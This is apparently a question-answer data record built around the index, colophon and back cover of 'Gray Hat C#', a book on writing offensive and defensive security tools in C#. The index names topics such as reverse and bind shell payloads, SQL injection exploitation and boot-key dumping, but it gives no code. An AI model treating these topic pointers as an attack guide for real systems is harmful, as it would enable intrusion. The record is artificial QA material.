    "text": "inDex\nA Authenticate() method\nMetasploitSession class, 213\nabstract classes\nNessusSession class, 105–106\nabstract Task class, 160–161\nNexposeSession class, 119–120\ndefined, 4\nauthentication\nsubclassing from, 5–6\nMetasploit RPC API, 208, 213–214\nabstract syntax tree (AST), 243\nNessusSession class, 105–109\nanonymous methods\nNexposeManager class, 124–125\nassigning delegate to method, 9\nNexposeSession class, 118–120\noptional arguments, 10–11\nOpenVASSession class, 135–136\nupdating Firefighter class, 9–10\nupdating Main() method, 11–12\nAPI (application program interface) B\nArachni REST API, 224–228\nBadStore ISO\nCuckoo Sandbox, 148–150\nbooting VM from, 17–18\nNessus, 103–105\nfuzzing POST requests, 25–31\nNexpose\nparameters, 29–31\nNexposeManager class, 124–125\nwriting requests, 27–29\nNexposeSession class, 118–124\nsqlmap utility and, 182, 184–185\nRPC API, 208–209\nbinding payloads, 85–86\nsqlmap REST API, 169–173\naccepting data, 86\nArachni, 223\nexecuting commands from stream,\narachni_rpcd script, 229\n87–88\narachni_rpc script, 229\nreturning output, 87\ninstalling, 223–224\nrunning commands, 87\nMain() method, 237–239\nbitmasks, 194\nREST API, 224–228\nbkhive tool, 263–264\nArachniHTTPManager class,\nblind SQL injection, 43–44\n226–228\ncreating true/false responses, 44\nArachniHTTPSession class,\nGetValue() method, 49–50\n225–226, 228\nMakeRequest() method, 47\nRPC, 228–237\nprinting values, 50–51\nArachniRPCManager class, 236–237\nretrieving lengths of values, 47–49\nArachniRPCSession class, 230–234\nBoolean-based blind SQL injection. See\nExecuteCommand() method,\nblind SQL injection\n234–235\nboot key, dumping\nArachniHTTPManager class, 226–228\nGetBootKey() method, 259–261,\nArachniHTTPSession class, 225–226, 228\n262–263\nArachniRPCManager class, 236–237\nGetNodeKey() method, 261–262\nArachniRPCSession class, 230–234\nGetValueKey() method, 261\nassets (Nexpose), 118, 126–127\nStringToByteArray() method, 262\nAST (abstract syntax tree), 243\nverifying boot key, 263–264\nattributes, defined, 13\nBurp Suite, 25–27\nC classes, 6–7\nabstract, 4, 5–6, 160–161\nC# language\nClamAV native library, 195\nanonymous methods, 9–12\ndefined, 4\nassigning delegate to method, 9\nCommon Intermediate Language\noptional arguments, 10–11\n(CIL) bytecode, 245\nupdating Firefighter class, 9–10\nCONCAT() SQL function, 39–40\nupdating Main() method, 11–12\nconnect-back payloads\nclasses, 4, 6–7\nnetwork stream, 82–84\ninterfaces, 4–7\nrunning, 84–85\nMain() method, 7–9\nrunning commands, 84–85\nnative libraries, 12–13\nconstructors, 6\ntypes and syntax, 2–3\nCreateOrUpdateSite() method\nchild nodes\n(NexposeManager class),\nregistry hives, 250, 254–257\n126–127\nSOAP, 58–67\nCreateSimpleTarget() method\nCIL (Common Intermediate\n(OpenVASManager class),\nLanguage) bytecode, 245\n141–142\ncl_scanfile() function (ClamEngine\nCreateSimpleTask() method\nclass), 198–200\n(OpenVASManager class), 143\nClamAV, 191\nCreateTask() method (CuckooManager\nclamd daemon, 201–206\nclass), 157–158\nClamdManager class, 204–205\ncross-site scripting (XSS), 20–22\nClamdSession class, 203–204\nCsharpVulnJson web application\ninstalling, 202\ncapturing vulnerable JSON request,\nstarting, 202–203\n31–33\ntesting, 205–206\nJSON fuzzer\ninstalling, 192–193\ncreating, 33–37\nnative library, 193–201\ntesting, 37–38\naccessing functions, 196–200\nsetting up vulnerable\nClamEngine class, 197–198\nappliance, 31\nclasses, 195\nCsharpVulnSoap web application,\nDispose() method, 198–200\n54, 78–79. See also SOAP\nenumerations, 194–195\nendpoints\nscanning files, 198–200\nCuckoo Sandbox, 147\ntesting, 200–201\ncreating file analysis task, 163–164\nClamBindings class, 196\nCuckooManager class, 157–162\nClamDatabaseOptions enum, 194\nabstract Task class, 160–161\nclamd daemon, 201–202\nCreateTask() method, 157–158\nClamdManager class, 204–205\nreporting methods, 159–160\nClamdSession class, 203–204\nsorting and creating different\ninstalling, 202\nclass types, 161–162\nstarting, 202–203\ntask details, 159\ntesting, 205–206\nCuckooSession class, 151–157\nClamdManager class (clamd daemon),\ncreating multipart HTTP Data\n204–205\nwith GetMultipartFormData()\nClamdSession class (clamd daemon),\nmethod, 153–155\n203–204\nFileParameter class, 155\nClamEngine class, 197–198\ntesting, 156–157\nClamReturnCode enum, 195\nwriting ExecuteCommand()\nClamScanOptions enum, 195\nmethods to handle HTTP\nrequests, 151–153\n266 Index\nmanually running API, 148–150 ExecuteGet() method (SqlmapSession\nsetting up, 148 class), 174–175\ntesting application, 164–165 Execute() method\ncurl command line tool ClamdSession class, 203–204\ntesting Arachni REST API, 225 MetasploitSession class, 213–215\ntesting Cuckoo status, 149–150 MSGPACK library, 210\ntesting Nexpose API, 118 ExecuteModule() method\ntesting sqlmap API, 170–173 (MetasploitManager class), 219\nExecutePost() method (SqlmapSession\nclass), 175\nD\nExecuteRequest() method\nDateTime class, 3 (ArachniHTTPSession\ndecompilers, 242–245 class), 226\nDecompressData() method exploiting SQL injections\n(ArachniRPCSession class), 233 Boolean-based blind SQL injection,\ndelegates, assigning to methods, 9 43–51\nDeleteSite() method (NexposeManager UNION-based, 38–43\nclass), 128\nDeleteTask() method (SqlmapManager\nF\nclass), 178–179\ndeserialization, 175 FileParameter class (CuckooSession\ndispatchers (RPC framework), 230 class), 155\nDispose() method FileTask class (Cuckoo Sandbox),\nArachniRPCSession class, 234 161–162\nClamAV native library, 198–200 First() method (connect-back\nClamEngine class, 200 payloads), 84\nCuckooManager class, 160 for loop\nMetasploitSession class, 216 child nodes and, 256–257\nNessusSession class, 107–108 methods and, 50–51\nNexposeSession class, 123 retrieving length of database count\nSqlmapManager class, 178 of user database, 45–46\nSqlmapSession class, 174 sending payloads within, 47\ndumping boot key functions\nGetBootKey() method, 259–261, ClamAV native library, 196–200\n262–263 declaring, 13\nGetNodeKey() method, 261–262 importing from libc, 98–99\nGetValueKey() method, 261 SQL, 39–40, 46\nStringToByteArray() method, 262 fuzzers, 15–16. See also fuzzing\nverifying boot key, 263–264 cross-site scripting and, 20–22\nSOAP, 185–190\nFuzzHttpGetPort() method\nE\nfuzzing SOAP service, 70–72\nEICAR file, 200–201 sqlmap utility, 189\nendpoints FuzzHttpPort() method (fuzzing SOAP\nSOAP. See SOAP endpoints service), 69\nsqlmap API, 167 FuzzHttpPostPort() method\nenumerations (ClamAV), 194–195 fuzzing SOAP service, 72–75\nExecuteCommand() methods sqlmap utility, 189–190\nArachniRPCSession class, 234–235 fuzzing\nCuckooSession class, 151–153 defined, 16\nNexposeSession class, 120–123 GET requests with mutational\nOpenVASSession class, 136–137 fuzzer, 22–25\nIndex 267\nfuzzing (continued) GetProgress() method\nJSON, 31–38 (ArachniRPCManager\ncapturing vulnerable JSON class), 237\nrequest, 31–33 GET requests\nHTTP requests, 33–34, 35–37 adding sqlmap GET request\niterating over key/value pairs, support to SOAP fuzzer,\n34–35 185–187\nsetting up vulnerable fuzzing with mutational fuzzer,\nappliance, 31 22–25\ntesting, 37–38 sqlmap REST API, 169–170\nPOST requests, 25–31 using WebRequest method to\nparameters, 29–31 execute, 174–175\nwriting requests, 27–29 GetScanConfigurations() method\nSOAP endpoints for SQL injection (OpenVASManager class),\nvulnerabilities, 68–79 141–142\nHTTP POST SOAP port, 72–75 GetScanStatus() method\nindividual SOAP services, 69–72 ArachniHTTPManager class, 227–228\nrunning fuzzer, 78–79 NexposeManager class, 127\nSOAP XML port, 75–78 SqlmapStatus class, 181–182\nSQL injections, 19–20, 38–51 GetStream() method\nvirtual machines, 16–18 ArachniRPCSession class, 233\nadding host-only virtual OpenVASSession class, 138\nnetwork, 16 GetTaskDetails() method (CuckooManager\nbooting from BadStore ISO, class), 159, 163\n17–18 GetTaskReport() method (CuckooManager\ncreating, 17 class), 159, 163\nFuzzService() method (SOAP GetTaskResults() method (OpenVASManager\nservice), 69 class), 143–144\nFuzzSoapPort() method GetTasks() method (OpenVASManager\nfuzzing SOAP service, 75–78 class), 143–144\nsqlmap utility, 188–189 GetValueKey() method, 261\nGetValue() method (blind SQL\ninjections), 49–50\nG\nGetVersion() method (ClamdManager\nget_version command (OpenVASSession class), 205\nclass), 139 globally unique ID (Guid), 110\nGetBootKey() method, 259–261, 262–263\nGetLength() method (blind SQL\nH\ninjection), 47–49\nGetLog() method (SqlmapLogItem class), Hello World example, 2–3\n183–184 host-only virtual network, adding\nGetMultipartFormData() method to VM, 16\n(CuckooSession class), HTTP requests\n153–155 building, 23–24\nGetNodeKey() method, 261–262 DELETE, 167\nGetObject() method (MetasploitSession GET requests\nclass), 216 adding sqlmap GET request\nGetOptions() method (SqlmapManager support to SOAP fuzzer,\nclass), 179 185–187\nGetPdfSiteReport() method fuzzing with mutational fuzzer,\n(NexposeManager class), 128 22–25\n268 Index\nsqlmap REST API, 169–170 iterating over key/value pairs,\nusing WebRequest method to 34–35\nexecute, 174–175 setting up vulnerable\nJSON appliance, 31\ncapturing vulnerable, 31–33 testing, 37–38\nFuzz() method, 35–37 Json.NET library, 34, 51\nreading, 33–34 JsonConvert class, 181\nNessusSession class, 106–107 SqlmapManager class, 177–179\nNexposeSession class, 120–121 SqlmapSession class, 176–177\nPOST\nfuzzing, 25–31, 72–75\nK\nintegrating sqlmap utility,\n187–188 kernel32.dll library, 96–98\nparameters, 28\nsqlmap API, 167, 170–172\nL\nPUT, 167\nREST APIs and, 104 Language-Integrated Query. See LINQ\nwriting ExecuteCommand() methods to Level property (SqlmapLogItem class),\nhandle, 151–153 182–183\nHTTP responses (NexposeSession class), libraries\n121–123 ClamAV, 193–201\nHttpWebRequest class, 24, 36, 42 accessing functions, 196–197\nClamEngine class, 197–198\nclasses, 195\nI\nDispose() method, 198–200\nIDEs (integrated development enumerations, 194–195\nenvironments), 1–2, 210 scanning files, 198–200\nIL (intermediate language), 246 testing, 200–201\nILSpy decompiler, 242 Json.NET, 34, 51\ninstances JsonConvert class, 181\ndefined, 4 SqlmapManager class, 177–179\nRPC framework, 230 SqlmapSession class, 176–177\ninstantiated objects, 24 MSGPACK, 209–210\nintegrated development environments installing, 211\n(IDEs), 1–2, 210 NuGet package manager, 210\ninterfaces, defined, 4–7 referencing, 211–212\nintermediate language (IL), 246 Object Relational Mapping, 20,\nint.Parse() method, 83, 176 242–244\nIsBusy() method (ArachniRPCManager LINQ (Language-Integrated Query)\nclass), 237 Descendants() method, 145\nLINQ to XML classes, 76\npayloads and, 87\nJ\nSingle() method, 69, 70\nJavaScript Object Notation. See JSON StringToByteArray() method, 262\nJoin() method (connect-back System.Linq namespace, 84\npayload), 84 Linux\nJSON (JavaScript Object Notation). BadStore ISO, 16, 17–18, 25–31\nSee also sqlmap utility ClamAV library, 193–201\nfuzzing executing native Linux payloads,\ncapturing vulnerable JSON 98–102\nrequest, 31–33 generating Metasploit payloads, 96\nHTTP requests, 33–34, 35–37 installing ClamAV, 192\nprintf() function, 13\nIndex 269\nLogOut() method MetasploitSession class, 212–213\nNessusSession class, 107–108 Execute() method, 213–215\nNexposeSession class, 121–123 testing, 217\nlong.Parse() method, 176 transforming response data,\n215–217\nmethod overloading, 151–152\nM\nmethods\nMain() method, 7–9 assigning delegates to, 9\nArachni, 237–239 defined, 4\nClamdManager class, 205 MID() SQL function, 46\nCuckoo Sandbox, 156, 163 MonoDevelop\nMetasploit, 219–220 installing, 2\nregistry hives, 259, 263 installing MSGPACK library,\nSOAP endpoint fuzzer, 68 210–212\nSqlmapManager class, 182 monodis program, 245–247\ntesting GetBootKey() method, 263 Mono framework. See managed\nMakeRequest() method assemblies\nblind SQL injections, 47 msfvenom tool (Metasploit), 96, 103\nNessusSession class, 106–107 MSGPACK library, 209–210\nmanaged assemblies, 241 installing, 211\nILSpy, 242 NuGet package manager, 210\nmonodis program, 245–247 referencing, 211–212\nNuGet packages, 242–244 mutational fuzzers\ntesting decompilers, 244–245 defined, 15\nmanaged code, 96 fuzzing GET requests with, 22–25\nMarshal.Copy() method (payloads),\n101–102\nN\nMarshal.GetDelegateForFunctionPointer()\nmethod (payloads), 101–102 Name property (SoapMessage class), 59, 61\nMessageBox() function (Windows), 13 namespaces\nMessagePackToDictionary() method defined, 3\n(MetasploitSession class), 215 SOAP XML, 76\nMessage property (SqlmapLogItem System.Linq namespace, 84\nclass), 182 XML, 56–57\nMetasploit, 207 native libraries, 12–13. See also libraries\ninteracting with shell, 221–222 native x86 assembly, 241. See also\nMSGPACK library, 209–212 managed assemblies\ninstalling, 211 Nessus, 103–104\nNuGet package manager, 210 NessusManager class, 109–110\nreferencing, 211–212 NessusSession class, 105–109\npayloads HTTP requests, 106–107\nexecuting native Linux logging out, 107–108\npayloads, 98–102 testing, 108–109\ngenerating, 96 performing scan, 110–113\nsetting up, 94–96 REST architecture and, 104–105\nunmanaged code, 96–98 .NET library. See managed assemblies\nRPC API, 208–209 network stream\nrunning exploit, 220–221 binding payloads, 85–88\nMetasploitable 2, 209 connect-back payloads, 82–84\nMetasploitManager class, 217–219 NewTask() method (SqlmapManager class),\n178–179\n270 Index\nNexpose, 115 ORM (Object Relational Mapping)\nautomating vulnerability scan, libraries, 20, 242–244\n126–127, 130 OS X\ninstalling, 116–118 ClamAV library, 192, 196\nNexposeManager class, 124–125 .NET decompilers, 242\nNexposeSession class, 118–124 Xamarin Studio, 2\nauthenticating API, 124\nDispose() method, 123\nP\nExecuteCommand() method,\n120–123 Packer class (Metasploit), 214\nfinding API version, 123–124 parameters, fuzzing, 29–31\nLogout() method, 121–123 Parameters property (SoapMessage\nPDF site report, 128, 130 class), 59\nperforming scan, 129 parent class, defined, 4\nNodeKey class (registry hives), 250, ParseChildNodes() method (NodeKey\n253–257 class), 256–257\nParseMessages() method (WSDL class\nconstructor), 57–58, 62\nO\nParse() methods\nobject-oriented language, 3 connect-back payload, 83\nObject Relational Mapping (ORM) int.Parse() method, 83, 176\nlibraries, 20, 242–244 long.Parse() method, 176\nobjects, defined, 4 ParseChildNodes() method, 256–257\nOMP (OpenVAS Management ParseMessages() method, 57–58, 62\nProtocol), 133 ParseTypes() method, 56–57\nOpenVAS, 133 short.Parse() method, 176\ninstalling, 134 ParseTypes() method (WSDL class\nOpenVASManager class, 140–145 constructor), 56–57\nautomation, 144–145 parsing\nCreateSimpleTarget() method, registry hives, 252–259\n141–142 WSDL XML documents, 55–67\nCreateSimpleTask() method, 143 SoapBinding class, 64–65\nGetScanConfigurations() method, SoapBindingOperation class,\n141–142 65–66\nGetTaskResults() method, SoapMessage class, 60–61\n143–144 SoapMessagePart class, 61–62\nGetTasks() method, 143–144 SoapOperation class, 63–64\nStartTask() method, 143 SoapPortType class, 62–63\nOpenVASSession class, 134–139 SoapService class, 66–67\nauthentication, 135–136 SoapType class, 58–60\nExecuteCommand() method, writing initial parsing methods,\n136–137 56–58\nget_version command, 139 WSDL class constructor, 55–56\nGetStream() method, 138 payloads, 81–82\nReadMessage() method, 137–138 binding, 85–88\nSSL certificate validation, accepting data, 86\n138–139 executing commands from\nOpenVAS Management Protocol stream, 87–88\n(OMP), 133 returning output, 87\noptional arguments, 10–11 running commands, 87\nORD() SQL function, 46\nIndex 271\npayloads (continued) ReadChildrenNodes() method (NodeKey\nconnect-back payloads, 82–85 class), 255–256\nnetwork stream, 82–84 ReadChildValues() method (NodeKey\nrunning, 84–85 class), 257\nrunning commands, 84–85 ReadInt32() method (NodeKey class), 255\nMetasploit, 94–102 ReadMessage() method\nexecuting native Linux ArachniRPCSession class, 233, 235\npayloads, 98–102 OpenVASSession class, 137–138\nexecuting native Windows ReadNodeStructure() method (NodeKey\npayloads as unmanaged class), 254–255\ncode, 96–98 Regex class (SQL injections), 42–43\ngenerating, 96 RegistryHive class, 252–253\nsetting up, 94–96 registry hives, 249–250\nusing UDP to attack network, dumping boot key, 259–264\n88–94 GetBootKey() method, 259–261,\nattacker’s code, 92–94 262–263\ncode for target machine, GetNodeKey() method, 261–262\n89–91 GetValueKey() method, 261\nPDF site report (Nexpose), 128, 130 StringToByteArray() method, 262\nPlatform Invoke (P/Invoke), 12, 193 verifying boot key, 263–264\nports (WSDL), 55 exporting, 250–252\nHTTP POST SOAP port, 72–75 reading, 252–259\nSOAP XML port, 75–78 NodeKey class, 253–257\nposix_memalign() function, 99–101 RegistryHive class, 252–253\nPOST parameters, sending to SOAP ValueKey class, 258–259\nservice, 74–75 structure of, 250\nPOST requests testing, 259\nfuzzing, 25–27 remote procedure call API. See RPC API\nparameters, 29–31 REST (representational state transfer)\nwriting requests, 27–29 architecture. See also sqlmap\nintegrating sqlmap utility, 187–188 utility\nsqlmap REST API, 170–172 Arachni and, 224–228\nprintf() function (Linux), 13 Cuckoo Sandbox and, 148–150\nProcess class Nessus and, 104–105\nbinding payloads, 87–88 sqlmap, 169–170\nconnect-back payload, 84–85 RLIKE keyword (blind SQL injections),\nnetwork attack via UDP, 91 43–44\nProcessStartInfo class calling methods, 50–51\nbinding payloads, 87–88 creating true/false responses, 44\nconnect-back payload, 84–85 GetValue() method, 49–50\nnetwork attack via UDP, 91 MakeRequest() method, 47\nproperties, defined, 4 printing values, 50–51\nPython retrieving lengths of values, 47–49\nCuckoo Sandbox and, 147, 149 userdb table, 45–47\nsqlmap, 168, 170 using to match search criteria,\n44–45\nroot node key (registry hives), 250\nR\nRPC (remote procedure call) API\nRapid7 Arachni, 228–237\nMetasploit, 94 ArachniRPCManager class, 236–237\nNexpose, 115–116 ArachniRPCSession class, 230–234\n272 Index\nExecuteCommand() method, running fuzzer, 78–79\n234–235 SOAP XML port, 75–78\nmanually running, 229–230 parsing WSDL XML documents,\nMetasploit, 208–209 55–67\nRuby programming language class constructor, 55–56\nArachni web application, 223 SoapBinding class, 64–65\nMetasploit, 94–96 SoapBindingOperation class,\nRuby Version Manager (RVM), 95 65–66\nSoapMessage class, 60–61\nSoapMessagePart class, 61–62\nS\nSoapOperation class, 63–64\nScanFile() method (ClamEngine class), SoapPortType class, 62–63\n198–200 SoapService class, 66–67\nScan() method (ClamdManager class), 205 SoapType class, 58–60\nscanning writing initial parsing methods,\nClamAV library, 198–200 56–58\nin Nessus, 110–113 setting up vulnerable endpoint, 54\nin Nexpose, 126–127, 129 SOAP fuzzer\nsqlmap scan log, 172 calling new methods, 188–190\nScanSite() method (NexposeManager GET requests, 185–187\nclass), 127 POST requests, 187–188\nSDLC (software development life SoapMessage class (WSDL), 57, 60–61\ncycle), 224 SoapMessagePart class (WSDL), 61–62\nSelectNodes() method (WSDL class SoapOperation class (WSDL), 63–64\nconstructor), 57 SoapPortType class (WSDL), 62–63\nSELinux, 100 SoapService class (WSDL), 66–67\nSerializeObject() method (JsonConvert SoapType class (WSDL), 58–60\nclass), 181 SoapTypeParameter class (WSDL), 60\nshell, interacting with Metasploit, SOAP XML port, fuzzing, 75–78\n221–222 Socket class, network attack via UDP, 89\nshort.Parse() method, 176 software development life cycle\nSimple Object Access Protocol (SOAP), (SDLC), 224\n19. See also SOAP endpoints; Split() method (connect-back\nSOAP fuzzer payload), 84\nSingle() method (LINQ), 69, 70 SQL (Structured Query Language).\nSkip() method (connect-back See SQL injections; sqlmap\npayload), 84 utility\nSOAP (Simple Object Access Protocol), SQL injections, 19–20\n19. See also SOAP endpoints; exploiting\nSOAP fuzzer Boolean-based blind SQL\nSOAPAction HTTP header (SOAP injection, 43–51\nendpoint), 77–78 UNION-based, 38–43\nSoapBinding class (WSDL), 64–65 fuzzing SOAP endpoints for\nSoapBindingOperation class (WSDL), vulnerabilities, 68–79\n65–66 HTTP POST SOAP port, 72–75\nSOAP endpoints, 53–54 individual SOAP services,\nautomatically fuzzing for SQL 69–72\ninjection vulnerabilities, running fuzzer, 78–79\n68–79 SOAP XML port, 75–78\nHTTP POST SOAP port, 72–75 SqlmapLogItem class, 182–183\nindividual SOAP services,\n69–72\nIndex 273\nSqlmapManager class, 177–179 subclassing, 4–6\nMain() method, 182 System.Linq namespace (connect-back\noptions, 179–180 payload), 84\nperforming scan, 180–182\nSqlmapSession class, 173–174\nT\nExecuteGet() method, 174–175\nExecutePost() method, 175 TaskFactory class (Cuckoo\ntesting, 176–177 Sandbox), 162\nSqlmapStatus class, 181–182 TCP (Transmission Control Protocol)\nsqlmap utility, 167–168 payloads, 81–82\nautomating scan, 183–185 binding, 85–88\nintegrating with SOAP fuzzer, connect-back payloads, 82–85\n185–190 UDP versus, 88–89\ncalling new methods, 188–190 TcpClient class\nGET requests, 185–187 clamd daemon, 203\nPOST requests, 187–188 connect-back payload, 82–84\nreporting scan, 182–183 TcpListener class (binding payloads),\nrunning, 168–173 85–86\nsqlmap REST API, 169–170 Tenable Network Security, 103\ntesting sqlmap API with curl, TestGetRequestWithSqlmap() method\n170–173 (SOAP fuzzer), 185–187\nSqlmapManager class, 177–179 testing\nMain() method, 182 ClamAV library, 200–201\noptions, 179–180 clamd daemon, 205–206\nperforming scan, 180–182 GetBootKey() method, 263\nSqlmapSession class, 173–174 JSON fuzzer, 37–38\nExecuteGet() method, 174–175 MetasploitSession class, 217\nExecutePost() method, 175 NessusSession class, 108–109\ntesting, 176–177 Nexpose, 118\nSSL certificate validation registry hives, 259\n(OpenVASSession class), SqlmapSession class, 176–177\n138–139 TestPostRequestWithSqlmap() method\nStartScan() method (SOAP fuzzer), 187–188\nArachniHTTPManager class, 227–228 Time property (SqlmapLogItem class), 183\nArachniRPCManager class, 237 TLS (Transport Layer Security), 121\nStartTask() method Transmission Control Protocol.\nOpenVASManager class, 143 See TCP\nSqlmapManager class, 180\nstateful protocol, 85–88\nU\nstateless protocol, 88\nstatic sites (Nexpose), 118 Ubuntu, 94\nStreamReader class constructor (connect- UDP (User Datagram Protocol)\nback payload), 83 TCP versus, 88–89\nStreamReader ReadLine() method using to attack network, 88–94\n(connect-back payload), 83 attacker’s code, 92–94\nstrings-type options (monodis code for target machine, 89–91\nprogram), 245 UdpClient class, 89\nStringToByteArray() method, 262 UNION-based SQL injections\nStructured Query Language. See SQL performing exploit by hand,\ninjections; sqlmap utility 38–40\n274 Index\nperforming exploit W\nprogrammatically, 40–43\nWeb Service Description Language\nbuilding URL with payload,\nXML documents, parsing.\n41–42\nSee WSDL XML documents,\ncreating markers to find user-\nparsing\nnames and passwords, 41\nwhile loop\nmaking HTTP request, 42–43\nconnect-back payload, 83\nunmanaged code, 96–98\nnetwork attack via UDP, 89–90\nUser Datagram Protocol. See UDP\nWindows\nusing keyword, 24\nClamAV library, 192, 196\nexecuting native Windows payloads\nV as unmanaged code, 96–98\ngenerating Metasploit payloads, 96\nValidateServerCertificate() method\nILSpy decompiler, 242\n(ArachniRPCSession\nkernel32.dll library, 96–97\nclass), 233\nMessageBox() function, 13\nValueKey class (registry hives), 250,\nregistry hives, 249–250\n258–259\ndumping boot key, 259–264\nVirtualAlloc() function, 96–98\nexporting, 250–252\nVirtualBox virtualization software, 16,\nreading, 252–259\n209. See also VMs\nstructure of, 250\nvirtual machines. See VMs\ntesting, 259\nVisual Studio IDE (Microsoft), 1–2\nWSDL (Web Service Description\nVMs (virtual machines), 12–13\nLanguage) XML\nadding host-only virtual\ndocuments, parsing, 55\nnetwork, 16\nclass constructor, 55–56\nbooting from BadStore ISO, 17–18\nSoapBinding class, 64–65\ncreating, 17\nSoapBindingOperation class, 65–66\nvulnerability scanners\nSoapMessage class, 60–61\nNessus, 103–113\nSoapMessagePart class, 61–62\nNessusManager class, 109–110\nSoapOperation class, 63–64\nNessusSession class, 105–109\nSoapPortType class, 62–63\nperforming scan, 110–113\nSoapType class, 58–60\nREST architecture and, 104–105\nwriting initial parsing methods,\nNexpose, 115–131\n56–58\nautomating vulnerability scan,\n126–127, 130\ninstalling, 116–118 X\nNexposeManager class, 124–125\nx86_64 assembly, 241. See also managed\nNexposeSession class, 118–124\nassemblies\nPDF site report, 128, 130\nXamarin Studio IDE, 2\nperforming scan, 129\nXElement class (SOAP XML), 76–77\nOpenVAS, 134–145\nXML node, 59–60\ninstalling, 134\nXPath query, 57–58\nOpenVASManager class, 140–145\nXSS (cross-site scripting), 20–22\nOpenVASSession class, 134–139\nIndex 275\nGray Hat C# is set in New Baskerville, Futura, Dogma, and TheSansMono\nCondensed. This book was printed and bound at Sheridan Books, Inc. in\nChelsea, Michigan. The paper is 60# Finch Smooth, which is certified by the\nForest Stewardship Council (FSC).\nThe book uses a layflat binding, in which the pages are bound together\nwith a cold-set, flexible glue and the first and last pages of the resulting book\nblock are attached to the cover. The cover is not actually glued to the book’s\nspine, and when open, the book lies flat and the spine doesn’t crack.\nRESOURCES\nVisit https://www.nostarch.com/grayhatcsharp/ for resources, errata, and more infor-\nmation.\nMore no-nonsense books from nO StaRCH PRESS\nROOtkitS and BOOtkitS attaCking nEtwORk SERiOUS CRyPtOgRaPHy\nReversing Modern Malware and PROtOCOlS by jean-philippe aumasson\nNext Generation Threats by james forshaw summer 2017, 304 pp., $49.95\nby alex matrosov, eugene fall 2017, 408 pp., $49.95 isbn 978-1-59327-826-7\nrodionov, and sergey bratus isbn 978-1-59327-750-5\nfall 2017, 504 pp., $49.95\nisbn 978-1-59327-716-1\nPRaCtiCal PaCkEt analySiS, tHE HaRdwaRE HaCkER BlaCk Hat PytHOn\n3Rd EditiOn Adventures in Making and Python Programming for Hackers and\nUsing Wireshark to Solve Breaking Hardware Pentesters\nReal-World Network Problems by andrew “bunnie” huang by justin seitz\nby chris sanders march 2017, 416 pp., $29.95 december 2014, 192 pp., $34.95\napril 2017, 368 pp., $49.95 isbn 978-1-59327-758-1 isbn 978-1-59327-590-7\nisbn 978-1-59327-802-1 hardcover\nphone: email:\n1.800.420.7240 or sales@nostarch.com\n1.415.863.9900 web:\nwww.nostarch.com\n“Get ready for a wild ride developing\noffensive and defensive C .”\n#\n—Matt Graeber, Microsoft MVP\nLearn to use C#’s powerful set of core libraries ✶ Parse and read offline registry hives to\nto automate tedious yet important tasks like dump system information\nfuzzing, performing vulnerability scans, and\n✶ Automate the security tools Arachni and\nanalyzing malware. With some help from\nMetasploit using their MSGPACK RPCs\nMono, you’ll write your own practical security\ntools that will run on Windows, OS X, Linux,\nStreamline and simplify your workday\nand even mobile devices.\nby making the most of C#’s extensive\nrepertoire of powerful tools and libraries\nAfter a crash course in C# and some of its\nwith Gray Hat C#.\nadvanced features, you’ll learn how to:\n✶ Write fuzzers that use the HTTP and XML\nAbout the Author\nlibraries to scan for SQL and XSS injections\n✶ Generate shellcode in Metasploit to create Brandon Perry has been writing C# applica-\ncross-platform and cross-architecture tions since the advent of the open source .NET\npayloads implementation Mono. In his free time, he\nenjoys writing modules for the Metasploit\n✶ Automate Nessus, OpenVAS, and sqlmap\nframework, parsing binary files, and fuzz-\nto scan for vulnerabilities and exploit SQL\ning things. He is the co-author of Wicked Cool\ninjections\nShell Scripts, 2nd Edition (No Starch Press). He\n✶ Write a .NET decompiler for OS X and Linux manages his software and other projects at\nhttps://volatileminds.net/.\nTHE FINEST IN GEEK ENTERTAINMENT™\nwww.nostarch.com\nPerry\nGray\nHat\nC#\nGray Hat C\n#\nA Hacker’s Guide to\nCreating and Automating Security Tools\n“I LIE FLAT.” This book uses a durable binding that won’t snap shut.\n$39.95 ($45.95 CDN) Shelve In: ComputerS/SeCurIty\nBrandon Perry\nForeword by Matt Graeber\nA\nHacker’s\nGuide\nto\nCreating\nand\nAutomating\nSecurity\nTools",
    "question": "What is the key topic or concept discussed in the provided text?",
    "summary": "Gray Hat C# is a book that teaches hackers how to create and automate security tools using C#. It covers topics such as fuzzing, vulnerability scanning, and malware analysis, with a focus on practical applications. The book also includes examples of how to use C# to interact with security tools like Arachni, Metasploit, and sqlmap, and how to develop tools that can run on multiple platforms."
  }
]